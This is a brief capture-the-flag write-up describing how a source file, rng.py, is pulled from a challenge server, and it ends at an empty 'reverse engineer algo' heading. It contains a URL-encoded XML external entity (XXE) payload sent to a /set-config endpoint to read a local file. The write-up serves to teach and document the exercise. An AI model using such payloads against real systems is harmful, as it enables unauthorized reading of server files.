# get `rng.py`

in [flag0](../flag0/README.md) we already got `main.py`, which references:
```python
from rng import *
# .....
	cur = next(26)
```

since python's internal PRNG is called `random`, not `rng.next`, i guessed this to be in a `rng.py`, and it could be accessed with exactly the same way as `main.py`:
```
/set-config?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22rng.py%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E
```

# reverse engineer algo
